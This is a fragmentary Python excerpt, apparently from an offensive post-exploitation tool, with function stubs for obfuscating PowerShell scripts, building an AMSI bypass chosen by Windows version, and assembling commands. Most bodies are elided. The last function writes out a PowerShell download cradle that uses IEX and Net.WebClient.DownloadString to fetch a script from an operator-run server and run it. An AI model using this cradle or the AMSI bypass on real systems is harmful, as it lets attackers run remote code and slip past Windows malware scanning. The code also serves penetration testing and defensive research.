...
def clean_ps_script(path_to_script):
    ps_script = path_to_script.split('/')[-1]
    obfs_ps_script = cfg.OBF_PATH / ps_script
...
def create_amsi_bypass(server_os):
    ...
    if "2012" in server_os or "7601" in server_os or "2008" in server_os: 
...
def create_ps_command(ps_command, force_ps32=False, dont_obfs=False, server_os='Windows'):
    """
    Creates our powershell command.
    """
...
def gen_ps_iex_cradle(context, scripts, command=str(), post_back=True, server_os='Windows'):
    ...
    if type(scripts) is str:
        ...
        launcher += "IEX (New-Object Net.WebClient).DownloadString('{server}://{addr}:{port}/{ps_script_name}'){command}".format(server=context.server,
